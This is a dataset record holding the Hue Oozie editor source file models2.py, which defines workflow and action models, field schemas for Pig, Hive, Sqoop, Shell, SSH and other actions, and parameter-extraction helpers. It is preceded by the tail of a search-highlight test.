        section_hits = inner_hits['sections']['hits']['hits']
        assert len(section_hits) == 1

        section_content_highlight = section_hits[0]['highlight']['sections.content']
        assert len(section_content_highlight) == 1

        assert expected in section_content_highlight[0]
/n/n/n",1
80,6641c62beaa1468082e47d82da5ed758d11c7735,"apps/oozie/src/oozie/models2.py/n/n#!/usr/bin/env python
# Licensed to Cloudera, Inc. under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  Cloudera, Inc. licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import json
import logging
import re
import time
import uuid

from datetime import datetime, timedelta
from dateutil.parser import parse
from string import Template

from django.utils.encoding import force_unicode
from desktop.lib.json_utils import JSONEncoderForHTML
from django.utils.translation import ugettext as _

from desktop.lib import django_mako
from desktop.models import Document2

from hadoop.fs.hadoopfs import Hdfs
from liboozie.submission2 import Submission
from liboozie.submission2 import create_directories

from oozie.conf import REMOTE_SAMPLE_DIR
from oozie.models import Workflow as OldWorflows
from oozie.utils import utc_datetime_format


LOG = logging.getLogger(__name__)


class Job(object):
  
  def find_all_parameters(self, with_lib_path=True):
    params = self.find_parameters()

    for param in self.parameters:
      params[param['name'].strip()] = param['value']

    return  [{'name': name, 'value': value} for name, value in params.iteritems() if with_lib_path or name != 'oozie.use.system.libpath']  

  @classmethod
  def get_workspace(cls, user):
    return REMOTE_SAMPLE_DIR.get().replace('$USER', user.username).replace('$TIME', str(time.time()))

  @property
  def validated_name(self):
    good_name = []

    for c in self.name[:40]:
      if not good_name:
        if not re.match('[a-zA-Z_]', c):
          c = '_'
      else:
        if not re.match('[\-_a-zA-Z0-9]', c):        
          c = '_'
      good_name.append(c)
      
    return ''.join(good_name)


class Workflow(Job):
  XML_FILE_NAME = 'workflow.xml'
  PROPERTY_APP_PATH = 'oozie.wf.application.path'
  SLA_DEFAULT = [
      {'key': 'enabled', 'value': False},
      {'key': 'nominal-time', 'value': ''},
      {'key': 'should-start', 'value': ''},
      {'key': 'should-end', 'value': ''},
      {'key': 'max-duration', 'value': ''},
      {'key': 'alert-events', 'value': ''},
      {'key': 'alert-contact', 'value': ''},
      {'key': 'notification-msg', 'value': ''},
      {'key': 'upstream-apps', 'value': ''},
  ]
  HUE_ID = 'hue-id-w'
  
  def __init__(self, data=None, document=None, workflow=None):
    self.document = document

    if document is not None:
      self.data = document.data
    elif data is not None:
      self.data = data
    else:
      self.data = json.dumps({
          'layout': [{
              ""size"":12, ""rows"":[
                  {""widgets"":[{""size"":12, ""name"":""Start"", ""id"":""3f107997-04cc-8733-60a9-a4bb62cebffc"", ""widgetType"":""start-widget"", ""properties"":{}, ""offset"":0, ""isLoading"":False, ""klass"":""card card-widget span12""}]},
                  {""widgets"":[{""size"":12, ""name"":""End"", ""id"":""33430f0f-ebfa-c3ec-f237-3e77efa03d0a"", ""widgetType"":""end-widget"", ""properties"":{}, ""offset"":0, ""isLoading"":False, ""klass"":""card card-widget span12""}]},
                  {""widgets"":[{""size"":12, ""name"":""Kill"", ""id"":""17c9c895-5a16-7443-bb81-f34b30b21548"", ""widgetType"":""kill-widget"", ""properties"":{}, ""offset"":0, ""isLoading"":False, ""klass"":""card card-widget span12""}]}
              ],
              ""drops"":[ ""temp""],
              ""klass"":""card card-home card-column span12""
          }],
          'workflow': workflow if workflow is not None else {
              ""id"": None, 
              ""uuid"": None,
              ""name"": ""My Workflow"",
              ""properties"": {
                  ""description"": """",
                  ""job_xml"": """",
                  ""sla_enabled"": False,
                  ""schema_version"": ""uri:oozie:workflow:0.5"",
                  ""sla_workflow_enabled"": False,
                  ""credentials"": [],
                  ""properties"": [],
                  ""sla"": Workflow.SLA_DEFAULT,
                  ""show_arrows"": True,
              },
              ""nodes"":[
                  {""id"":""3f107997-04cc-8733-60a9-a4bb62cebffc"",""name"":""Start"",""type"":""start-widget"",""properties"":{},""children"":[{'to': '33430f0f-ebfa-c3ec-f237-3e77efa03d0a'}]},            
                  {""id"":""33430f0f-ebfa-c3ec-f237-3e77efa03d0a"",""name"":""End"",""type"":""end-widget"",""properties"":{},""children"":[]},
                  {""id"":""17c9c895-5a16-7443-bb81-f34b30b21548"",""name"":""Kill"",""type"":""kill-widget"",""properties"":{'message': _('Action failed, error message[${wf:errorMessage(wf:lastErrorNode())}]')},""children"":[]}
              ]
          }
      })
      
  @property
  def id(self):
    return self.document.id  
  
  @property
  def uuid(self):
    return self.document.uuid   
  
  def get_json(self):
    _data = self.get_data()

    return json.dumps(_data)
 
  def get_data(self):
    _data = json.loads(self.data)
    
    if self.document is not None:
      _data['workflow']['id'] = self.document.id
      _data['workflow']['dependencies'] = list(self.document.dependencies.values('uuid',))
    else:
      _data['workflow']['dependencies'] = []

    if 'parameters' not in _data['workflow']['properties']:
      _data['workflow']['properties']['parameters'] = [
          {'name': 'oozie.use.system.libpath', 'value': True},
      ]
    if 'show_arrows' not in _data['workflow']['properties']:
      _data['workflow']['properties']['show_arrows'] = True

    return _data
  
  def to_xml(self, mapping=None):
    if mapping is None:
      mapping = {}
    tmpl = 'editor/gen2/workflow.xml.mako'

    data = self.get_data()
    nodes = [node for node in self.nodes if node.name != 'End'] + [node for node in self.nodes if node.name == 'End'] # End at the end
    node_mapping = dict([(node.id, node) for node in nodes])
    
    sub_wfs_ids = [node.data['properties']['workflow'] for node in nodes if node.data['type'] == 'subworkflow']
    workflow_mapping = dict([(workflow.uuid, Workflow(document=workflow)) for workflow in Document2.objects.filter(uuid__in=sub_wfs_ids)])

    xml = re.sub(re.compile('\s*\n+', re.MULTILINE), '\n', django_mako.render_to_string(tmpl, {
              'wf': self,
              'workflow': data['workflow'],
              'nodes': nodes,
              'mapping': mapping,
              'node_mapping': node_mapping,
              'workflow_mapping': workflow_mapping
          }))
    return force_unicode(xml)

  @property
  def name(self):
    _data = self.get_data()
    return _data['workflow']['name']
  
  def update_name(self, name):
    _data = self.get_data()
    _data['workflow']['name'] = name
    self.data = json.dumps(_data)  

  @property      
  def deployment_dir(self):
    _data = self.get_data()
    return _data['workflow']['properties']['deployment_dir']
  
  @property      
  def parameters(self):
    _data = self.get_data()
    return _data['workflow']['properties']['parameters']

  @property      
  def sla_enabled(self):
    _data = self.get_data()
    return _data['workflow']['properties']['sla_enabled']

  @property      
  def sla(self):
    _data = self.get_data()
    return _data['workflow']['properties']['sla']

  @property      
  def nodes(self):
    _data = self.get_data()
    return [Node(node) for node in _data['workflow']['nodes']]

  def find_parameters(self):
    params = set()

    if self.sla_enabled:
      for param in find_json_parameters(self.sla):
        params.add(param)

    for node in self.nodes:
      params.update(node.find_parameters())

    return dict([(param, '') for param in list(params)])

  def set_workspace(self, user):
    _data = json.loads(self.data)

    _data['workflow']['properties']['deployment_dir'] = Job.get_workspace(user)
    
    self.data = json.dumps(_data)

  def check_workspace(self, fs, user):
    # Create optional root workspace for the first submission    
    root = REMOTE_SAMPLE_DIR.get().rsplit('/', 1)
    if len(root) > 1 and '$' not in root[0]:      
      create_directories(fs, [root[0]])

    Submission(user, self, fs, None, {})._create_dir(self.deployment_dir)
    Submission(user, self, fs, None, {})._create_dir(Hdfs.join(self.deployment_dir, 'lib'))


class Node():
  def __init__(self, data):    
    self.data = data
    
    self._augment_data()
    
  def to_xml(self, mapping=None, node_mapping=None, workflow_mapping=None):
    if mapping is None:
      mapping = {}
    if node_mapping is None:
      node_mapping = {}
    if workflow_mapping is None:
      workflow_mapping = {}

    data = {
      'node': self.data,
      'mapping': mapping,
      'node_mapping': node_mapping,
      'workflow_mapping': workflow_mapping
    }

    return django_mako.render_to_string(self.get_template_name(), data)

  @property      
  def id(self):
    return self.data['id']
  
  @property      
  def name(self):
    return self.data['name']

  @property      
  def sla_enabled(self):
    _data = self.get_data()
    return _data['workflow']['properties']['sla_enabled']

  def _augment_data(self):
    self.data['type'] = self.data['type'].replace('-widget', '')
    self.data['uuid'] = self.data['id']
    
    # Action Node
    if 'credentials' not in self.data['properties']:
      self.data['properties']['credentials'] = []     
    if 'prepares' not in self.data['properties']:
      self.data['properties']['prepares'] = []
    if 'job_xml' not in self.data['properties']:
      self.data['properties']['job_xml'] = []      
    if 'properties' not in self.data['properties']:
      self.data['properties']['properties'] = []
    if 'params' not in self.data['properties']:
      self.data['properties']['params'] = []
    if 'files' not in self.data['properties']:
      self.data['properties']['files'] = []
    if 'archives' not in self.data['properties']:
      self.data['properties']['archives'] = []
    if 'sla_enabled' not in self.data['properties']:
      self.data['properties']['sla_enabled'] = False
    if 'sla' not in self.data['properties']:
      self.data['properties']['sla'] = []
    
  def get_template_name(self):
    return 'editor/gen2/workflow-%s.xml.mako' % self.data['type']    

  def find_parameters(self):
    return find_parameters(self)    


class Action(object):
  
  @classmethod
  def get_fields(cls):
    return [(f['name'], f['value']) for f in cls.FIELDS.itervalues()] + [('sla', Workflow.SLA_DEFAULT), ('credentials', [])]


class StartNode(Action):
  TYPE = 'start'
  FIELDS = {}


class EndNode(Action):
  TYPE = 'end'
  FIELDS = {}


class PigAction(Action):
  TYPE = 'pig'
  FIELDS = {
     'script_path': { 
          'name': 'script_path',
          'label': _('Script'),
          'value': '',
          'help_text': _('Path to the script on HDFS.'),
          'type': ''
     },            
     'parameters': { 
          'name': 'parameters',
          'label': _('Parameters'),
          'value': [],
          'help_text': _('The Pig parameters of the script without -param. e.g. INPUT=${inputDir}'),
          'type': ''
     },
     'arguments': { 
          'name': 'arguments',
          'label': _('Arguments'),
          'value': [],
          'help_text': _('The Pig parameters of the script as is. e.g. -param, INPUT=${inputDir}'),
          'type': ''
     },
     # Common
     'files': { 
          'name': 'files',
          'label': _('Files'),
          'value': [],
          'help_text': _('Files put in the running directory.'),
          'type': ''
     },
     'archives': { 
          'name': 'archives',
          'label': _('Archives'),
          'value': [],
          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),
          'type': ''
     },
     'job_properties': { 
          'name': 'job_properties',
          'label': _('Hadoop job properties'),
          'value': [],
          'help_text': _('value, e.g. production'),
          'type': ''
     },
     'prepares': { 
          'name': 'prepares',
          'label': _('Prepares'),
          'value': [],
          'help_text': _('Path to manipulate before starting the application.'),
          'type': ''
     },
     'job_xml': { 
          'name': 'job_xml',
          'label': _('Job XML'),
          'value': [],
          'help_text': _('Refer to a Hadoop JobConf job.xml'),
          'type': ''
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['script_path']]


class JavaAction(Action):
  TYPE = 'java'
  FIELDS = {
     'jar_path': { 
          'name': 'jar_path',
          'label': _('Jar name'),
          'value': '',
          'help_text': _('Path to the jar on HDFS.'),
          'type': ''
     },            
     'main_class': { 
          'name': 'main_class',
          'label': _('Main class'),
          'value': '',
          'help_text': _('Java class. e.g. org.apache.hadoop.examples.Grep'),
          'type': 'text'
     },
     'arguments': { 
          'name': 'arguments',
          'label': _('Arguments'),
          'value': [],
          'help_text': _('Arguments of the main method. The value of each arg element is considered a single argument '
                         'and they are passed to the main method in the same order.'),
          'type': ''
     },
     'java_opts': { 
          'name': 'java_opts',
          'label': _('Java options'),
          'value': [],
          'help_text': _('Parameters for the JVM, e.g. -Dprop1=a -Dprop2=b'),
          'type': ''
     },
     'capture_output': { 
          'name': 'capture_output',
          'label': _('Capture output'),
          'value': False,
          'help_text': _('Capture output of the stdout of the %(program)s command execution. The %(program)s '
                         'command output must be in Java Properties file format and it must not exceed 2KB. '
                         'From within the workflow definition, the output of an %(program)s action node is accessible '
                         'via the String action:output(String node, String key) function') % {'program': TYPE.title()},
          'type': ''
     },
     # Common
     'files': { 
          'name': 'files',
          'label': _('Files'),
          'value': [],
          'help_text': _('Files put in the running directory.'),
          'type': ''
     },
     'archives': { 
          'name': 'archives',
          'label': _('Archives'),
          'value': [],
          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),
          'type': ''
     },
     'job_properties': { 
          'name': 'job_properties',
          'label': _('Hadoop job properties'),
          'value': [],
          'help_text': _('value, e.g. production'),
          'type': ''
     },
     'prepares': { 
          'name': 'prepares',
          'label': _('Prepares'),
          'value': [],
          'help_text': _('Path to manipulate before starting the application.'),
          'type': ''
     },
     'job_xml': { 
          'name': 'job_xml',
          'label': _('Job XML'),
          'value': [],
          'help_text': _('Refer to a Hadoop JobConf job.xml'),
          'type': ''
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['jar_path'], cls.FIELDS['main_class']]
  
  
class HiveAction(Action):
  TYPE = 'hive'
  FIELDS = {
     'script_path': { 
          'name': 'script_path',
          'label': _('Script'),
          'value': '',
          'help_text': _('Path to the script on HDFS.'),
          'type': ''
     },            
     'parameters': { 
          'name': 'parameters',
          'label': _('Parameters'),
          'value': [],
          'help_text': _('The %(type)s parameters of the script. E.g. N=5, INPUT=${inputDir}')  % {'type': TYPE.title()},
          'type': ''
     },
     # Common
     'files': { 
          'name': 'files',
          'label': _('Files'),
          'value': [],
          'help_text': _('Files put in the running directory.'),
          'type': ''
     },
     'archives': { 
          'name': 'archives',
          'label': _('Archives'),
          'value': [],
          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),
          'type': ''
     },
     'job_properties': { 
          'name': 'job_properties',
          'label': _('Hadoop job properties'),
          'value': [],
          'help_text': _('value, e.g. production'),
          'type': ''
     },
     'prepares': { 
          'name': 'prepares',
          'label': _('Prepares'),
          'value': [],
          'help_text': _('Path to manipulate before starting the application.'),
          'type': ''
     },
     'hive_xml': { 
          'name': 'hive_xml',
          'label': _('Hive XML'),
          'value': [],
          'help_text': _('Refer to a hive-site.xml renamed hive-conf.xml'),
          'type': ''
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['script_path'], cls.FIELDS['hive_xml']]


class HiveServer2Action(Action):
  TYPE = 'hive2'
  FIELDS = {
     'script_path': { 
          'name': 'script_path',
          'label': _('Script'),
          'value': '',
          'help_text': _('Path to the script on HDFS.'),
          'type': ''
     },            
     'parameters': { 
          'name': 'parameters',
          'label': _('Parameters'),
          'value': [],
          'help_text': _('The %(type)s parameters of the script. E.g. N=5, INPUT=${inputDir}')  % {'type': TYPE.title()},
          'type': ''
     },
     # Common
     'jdbc_url': { 
          'name': 'jdbc_url',
          'label': _('JDBC URL'),
          'value': 'jdbc:hive2://localhost:10000/default',
          'help_text': _('JDBC URL for the Hive Server 2. Beeline will use this to know where to connect to.'),
          'type': ''
     },     
     'password': { 
          'name': 'password',
          'label': _('Password'),
          'value': '',
          'help_text': _('The password element must contain the password of the current user. However, the password is only used if Hive Server 2 is backed by '
                         'something requiring a password (e.g. LDAP); non-secured Hive Server 2 or Kerberized Hive Server 2 don\'t require a password.'),
          'type': ''
     },
     'files': { 
          'name': 'files',
          'label': _('Files'),
          'value': [],
          'help_text': _('Files put in the running directory.'),
          'type': ''
     },
     'archives': { 
          'name': 'archives',
          'label': _('Archives'),
          'value': [],
          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),
          'type': ''
     },
     'job_properties': { 
          'name': 'job_properties',
          'label': _('Hadoop job properties'),
          'value': [],
          'help_text': _('value, e.g. production'),
          'type': ''
     },
     'prepares': { 
          'name': 'prepares',
          'label': _('Prepares'),
          'value': [],
          'help_text': _('Path to manipulate before starting the application.'),
          'type': ''
     },
     'job_xml': { 
          'name': 'job_xml',
          'label': _('Job XML'),
          'value': [],
          'help_text': _('Refer to a Hadoop JobConf job.xml'),
          'type': ''
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['script_path']]


class SubWorkflowAction(Action):
  TYPE = 'subworkflow'
  FIELDS = {
     'workflow': { 
          'name': 'workflow',
          'label': _('Sub-workflow'),
          'value': None,
          'help_text': _('The sub-workflow application to include. You must own all the sub-workflows'),
          'type': 'workflow'
     },
     'propagate_configuration': { 
          'name': 'propagate_configuration',
          'label': _('Propagate configuration'),
          'value': True,
          'help_text': _('If the workflow job configuration should be propagated to the child workflow.'),
          'type': ''
     },
     'job_properties': { 
          'name': 'job_properties',
          'label': _('Hadoop job properties'),
          'value': [],
          'help_text': _('Can be used to specify the job properties that are required to run the child workflow job.'),
          'type': ''
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['workflow']] 


class SqoopAction(Action):
  TYPE = 'sqoop'
  FIELDS = {
     'command': { 
          'name': 'command',
          'label': _('Sqoop command'),
          'value': 'import  --connect jdbc:hsqldb:file:db.hsqldb --table TT --target-dir hdfs://localhost:8020/user/foo -m 1',
          'help_text': _('The full %(type)s command. Either put it here or split it by spaces and insert the parts as multiple parameters below.') % {'type': TYPE},
          'type': 'textarea'
     },            
     'parameters': { 
          'name': 'parameters',
          'label': _('Arguments'),
          'value': [],
          'help_text': _('If no command is specified, split the command by spaces and insert the %(type)s parameters '
                         'here e.g. import, --connect, jdbc:hsqldb:file:db.hsqldb, ...') % {'type': TYPE},
          'type': ''
     },
     # Common
     'files': { 
          'name': 'files',
          'label': _('Files'),
          'value': [],
          'help_text': _('Files put in the running directory.'),
          'type': ''
     },
     'archives': { 
          'name': 'archives',
          'label': _('Archives'),
          'value': [],
          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),
          'type': ''
     },
     'job_properties': { 
          'name': 'job_properties',
          'label': _('Hadoop job properties'),
          'value': [],
          'help_text': _('value, e.g. production'),
          'type': ''
     },
     'prepares': { 
          'name': 'prepares',
          'label': _('Prepares'),
          'value': [],
          'help_text': _('Path to manipulate before starting the application.'),
          'type': ''
     },
     'job_xml': { 
          'name': 'job_xml',
          'label': _('Job XML'),
          'value': [],
          'help_text': _('Refer to a Hadoop JobConf job.xml'),
          'type': ''
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['command']]


class MapReduceAction(Action):
  TYPE = 'mapreduce'
  FIELDS = {
     'jar_path': { 
          'name': 'jar_path',
          'label': _('Jar name'),
          'value': '',
          'help_text': _('Path to the jar on HDFS.'),
          'type': ''
     },
     # Common
     'files': { 
          'name': 'files',
          'label': _('Files'),
          'value': [],
          'help_text': _('Files put in the running directory.'),
          'type': ''
     },
     'archives': { 
          'name': 'archives',
          'label': _('Archives'),
          'value': [],
          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),
          'type': ''
     },
     'job_properties': { 
          'name': 'job_properties',
          'label': _('Hadoop job properties'),
          'value': [],
          'help_text': _('value, e.g. production'),
          'type': ''
     },
     'prepares': { 
          'name': 'prepares',
          'label': _('Prepares'),
          'value': [],
          'help_text': _('Path to manipulate before starting the application.'),
          'type': ''
     },
     'job_xml': { 
          'name': 'job_xml',
          'label': _('Job XML'),
          'value': [],
          'help_text': _('Refer to a Hadoop JobConf job.xml'),
          'type': ''
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['jar_path']]


class ShellAction(Action):
  TYPE = 'shell' 
  FIELDS = {
     'shell_command': { 
          'name': 'shell_command',
          'label': _('Shell command'),
          'value': '',
          'help_text': _('Shell command to execute, e.g script.sh'),
          'type': ''
     },            
     'arguments': {
          'name': 'arguments',
          'label': _('Arguments'),
          'value': [],
          'help_text': _('One arg, e.g. -l, --help'),
          'type': ''
     },    
     'env_var': { 
          'name': 'env_var',
          'label': _('Environment variables'),
          'value': [],
          'help_text': _('e.g. MAX=10 or PATH=$PATH:mypath'),
          'type': ''
     },         
     'capture_output': { 
          'name': 'capture_output',
          'label': _('Capture output'),
          'value': True,
          'help_text': _('Capture output of the stdout of the %(program)s command execution. The %(program)s '
                         'command output must be in Java Properties file format and it must not exceed 2KB. '
                         'From within the workflow definition, the output of an %(program)s action node is accessible '
                         'via the String action:output(String node, String key) function') % {'program': TYPE},
          'type': ''
     },
     # Common
     'files': { 
          'name': 'files',
          'label': _('Files'),
          'value': [],
          'help_text': _('Files put in the running directory.'),
          'type': ''
     },
     'archives': { 
          'name': 'archives',
          'label': _('Archives'),
          'value': [],
          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.'),
          'type': ''
     },
     'job_properties': { 
          'name': 'job_properties',
          'label': _('Hadoop job properties'),
          'value': [],
          'help_text': _('value, e.g. production'),
          'type': ''
     },
     'prepares': { 
          'name': 'prepares',
          'label': _('Prepares'),
          'value': [],
          'help_text': _('Path to manipulate before starting the application.'),
          'type': ''
     },
     'job_xml': { 
          'name': 'job_xml',
          'label': _('Job XML'),
          'value': [],
          'help_text': _('Refer to a Hadoop JobConf job.xml'),
          'type': ''
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['shell_command']]


class SshAction(Action):
  TYPE = 'ssh' 
  FIELDS = {
     'host': { 
          'name': 'host',
          'label': _('User and Host'),
          'value': 'user@host.com',
          'help_text': _('Where the shell will be executed.'),
          'type': 'text'
     },         
     'ssh_command': { 
          'name': 'ssh_command',
          'label': _('Ssh command'),
          'value': 'ls',
          'help_text': _('The path of the Shell command to execute.'),
          'type': 'textarea'
     },    
     'arguments': {
          'name': 'arguments',
          'label': _('Arguments'),
          'value': [],
          'help_text': _('One arg, e.g. -l, --help'),
          'type': ''
     },
     'capture_output': { 
          'name': 'capture_output',
          'label': _('Capture output'),
          'value': True,
          'help_text': _('Capture output of the stdout of the %(program)s command execution. The %(program)s '
                         'command output must be in Java Properties file format and it must not exceed 2KB. '
                         'From within the workflow definition, the output of an %(program)s action node is accessible '
                         'via the String action:output(String node, String key) function') % {'program': TYPE},
          'type': ''
     },
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['host'], cls.FIELDS['ssh_command']]


class FsAction(Action):
  TYPE = 'fs' 
  FIELDS = {
     'deletes': { 
          'name': 'deletes',
          'label': _('Delete path'),
          'value': [],
          'help_text': _('Deletes recursively all content.'),
          'type': ''
     },
     'mkdirs': { 
          'name': 'mkdirs',
          'label': _('Create directory'),
          'value': [],
          'help_text': _('Sub directories are created if needed.'),
          'type': ''
     },
     'moves': { 
          'name': 'moves',
          'label': _('Move file or directory'),
          'value': [],
          'help_text': _('Destination.'),
          'type': ''
     },  
     'chmods': { 
          'name': 'chmods',
          'label': _('Change permissions'),
          'value': [],
          'help_text': _('File or directory.'),
          'type': ''
     },
     'touchzs': { 
          'name': 'touchzs',
          'label': _('Create or touch a file'),
          'value': [],
          'help_text': _('Or update its modification date.'),
          'type': ''
     },
     'chgrps': { 
          'name': 'chgrps',
          'label': _('Change the group'),
          'value': [],
          'help_text': _('File or directory.'),
          'type': ''
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['deletes'], cls.FIELDS['mkdirs'], cls.FIELDS['moves'], cls.FIELDS['chmods']]


class EmailAction(Action):
  TYPE = 'email' 
  FIELDS = {
     'to': { 
          'name': 'to',
          'label': _('To addresses'),
          'value': '',
          'help_text': _('Comma-separated values'),
          'type': 'text'
     },         
     'cc': { 
          'name': 'cc',
          'label': _('Cc addresses (optional)'),
          'value': '',
          'help_text': _('Comma-separated values'),
          'type': 'text'
     },    
     'subject': {
          'name': 'subject',
          'label': _('Subject'),
          'value': '',
          'help_text': _('Plain-text'),
          'type': 'text'
     },
     'body': { 
          'name': 'body',
          'label': _('Body'),
          'value': '',
          'help_text': _('Plain-text'),
          'type': 'textarea'
     },
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['to'], cls.FIELDS['subject'], cls.FIELDS['body']]


class StreamingAction(Action):
  TYPE = 'streaming'
  FIELDS = {
     'mapper': { 
          'name': 'mapper',
          'label': _('Mapper'),
          'value': '',
          'help_text': _('The executable/script to be used as mapper.'),
          'type': ''
     },
     'reducer': { 
          'name': 'reducer',
          'label': _('Reducer'),
          'value': '',
          'help_text': _('The executable/script to be used as reducer.'),
          'type': ''
     },
     # Common
     'files': { 
          'name': 'files',
          'label': _('Files'),
          'value': [],
          'help_text': _('Files put in the running directory.')
     },
     'archives': { 
          'name': 'archives',
          'label': _('Archives'),
          'value': [],
          'help_text': _('zip, tar and tgz/tar.gz uncompressed into the running directory.')
     },
     'job_properties': { 
          'name': 'job_properties',
          'label': _('Hadoop job properties'),
          'value': [],
          'help_text': _('value, e.g. production')
     },
     'prepares': { 
          'name': 'prepares',
          'label': _('Prepares'),
          'value': [],
          'help_text': _('Path to manipulate before starting the application.')
     },
     'job_xml': { 
          'name': 'job_xml',
          'label': _('Job XML'),
          'value': [],
          'help_text': _('Refer to a Hadoop JobConf job.xml')
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['mapper'], cls.FIELDS['reducer']]


class DistCpAction(Action):
  TYPE = 'distcp'
  FIELDS = {
     'distcp_parameters': { 
          'name': 'distcp_parameters',
          'label': _('Arguments'),
          'value': [{'value': ''}, {'value': ''}],
          'help_text': _('Options first, then source / destination paths'),
          'type': 'distcp'
     },
      # Common
     'prepares': { 
          'name': 'prepares',
          'label': _('Prepares'),
          'value': [],
          'help_text': _('Path to manipulate before starting the application.')
     },
     'job_properties': { 
          'name': 'job_properties',
          'label': _('Hadoop job properties'),
          'value': [],
          'help_text': _('value, e.g. production')
     },
     'java_opts': { 
          'name': 'java_opts',
          'label': _('Java options'),
          'value': '',
          'help_text': _('Parameters for the JVM, e.g. -Dprop1=a -Dprop2=b')
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['distcp_parameters']]


class KillAction(Action):
  TYPE = 'kill'
  FIELDS = {
     'message': { 
          'name': 'message',
          'label': _('Message'),
          'value': _('Action failed, error message[${wf:errorMessage(wf:lastErrorNode())}]'),
          'help_text': _('Message to display when the workflow fails. Can contain some EL functions.'),
          'type': 'textarea'
     }
  }

  @classmethod
  def get_mandatory_fields(cls):
    return [cls.FIELDS['message']]


class JoinAction(Action):
  TYPE = 'join'
  FIELDS = {}
  
  @classmethod
  def get_mandatory_fields(cls):
    return []


class ForkNode(Action):
  TYPE = 'fork'
  FIELDS = {}
  
  @classmethod
  def get_mandatory_fields(cls):
    return []


class DecisionNode(Action):
  TYPE = 'decision'
  FIELDS = {}
  
  @classmethod
  def get_mandatory_fields(cls):
    return []
  

NODES = {
  'start-widget': StartNode,
  'end-widget': EndNode,
  'pig-widget': PigAction,
  'java-widget': JavaAction,
  'hive-widget': HiveAction,
  'hive2-widget': HiveServer2Action,
  'sqoop-widget': SqoopAction,
  'mapreduce-widget': MapReduceAction,  
  'subworkflow-widget': SubWorkflowAction,
  'shell-widget': ShellAction,
  'ssh-widget': SshAction,  
  'fs-widget': FsAction,
  'email-widget': EmailAction,
  'streaming-widget': StreamingAction,
  'distcp-widget': DistCpAction,  
  'kill-widget': KillAction,
  'join-widget': JoinAction,
  'fork-widget': ForkNode,
  'decision-widget': DecisionNode,  
}


WORKFLOW_NODE_PROPERTIES = {}
for node in NODES.itervalues():
  WORKFLOW_NODE_PROPERTIES.update(node.FIELDS)



def find_parameters(instance, fields=None):
  """"""Find parameters in the given fields""""""
  if fields is None:
    fields = NODES['%s-widget' % instance.data['type']].FIELDS.keys()

  params = []
  for field in fields:
    data = instance.data['properties'][field]
    if field == 'sla' and not instance.sla_enabled:
      continue
    if isinstance(data, list):
      params.extend(find_json_parameters(data))
    elif isinstance(data, basestring):
      for match in Template.pattern.finditer(data):
        name = match.group('braced')
        if name is not None:
          params.append(name)

  return params

def find_json_parameters(fields):
  # Input is list of json dict
  params = []

  for field in fields:
    for data in field.values():
      if isinstance(data, basestring):
        for match in Template.pattern.finditer(data):
          name = match.group('braced')
          if name is not None:
            params.append(name)

  return params

def find_dollar_variables(text):
  return re.findall('[^\n\\\\]\$([^\{ \'\""\-;\(\)]+)', text, re.MULTILINE)  

def find_dollar_braced_variables(text):
  vars = set()
  
  for var in re.findall('\$\{(.+)\}', text, re.MULTILINE):  
    if ':' in var:
      var = var.split(':', 1)[1]    
    vars.add(var)
  
  return list(vars) 




def import_workflows_from_hue_3_7():
  return import_workflow_from_hue_3_7(OldWorflows.objects.filter(managed=True).filter(is_trashed=False)[12].get_full_node())


def import_workflow_from_hue_3_7(old_wf):
  """"""
  Example of data to transform

  [<Start: start>, <Pig: Pig>, [<Kill: kill>], [<End: end>]]
  [<Start: start>, <Java: TeraGenWorkflow>, <Java: TeraSort>, [<Kill: kill>], [<End: end>]]
  [<Start: start>, [<Fork: fork-34>, [[<Mapreduce: Sleep-1>, <Mapreduce: Sleep-10>], [<Mapreduce: Sleep-5>, [<Fork: fork-38>, [[<Mapreduce: Sleep-3>], [<Mapreduce: Sleep-4>]], <Join: join-39>]]], <Join: join-35>], [<Kill: kill>], [<End: end>]]
  """"""
  
  uuids = {}

  old_nodes = old_wf.get_hierarchy()
  
  wf = Workflow()
  wf_rows = []
  wf_nodes = []
  
  data = wf.get_data()
  
  # UUIDs node mapping
  for node in old_wf.node_list:    
    if node.name == 'kill':
      node_uuid = '17c9c895-5a16-7443-bb81-f34b30b21548'
    elif node.name == 'start':
      node_uuid = '3f107997-04cc-8733-60a9-a4bb62cebffc'
    elif node.name == 'end':
      node_uuid = '33430f0f-ebfa-c3ec-f237-3e77efa03d0a'
    else:
      node_uuid = str(uuid.uuid4())

    uuids[node.id] = node_uuid
    
  # Workflow
  data['workflow']['uuid'] = str(uuid.uuid4())
  data['workflow']['name'] = old_wf.name
  data['workflow']['properties']['properties'] = json.loads(old_wf.job_properties)
  data['workflow']['properties']['job_xml'] = old_wf.job_xml
  data['workflow']['properties']['description'] = old_wf.description
  data['workflow']['properties']['schema_version'] = old_wf.schema_version
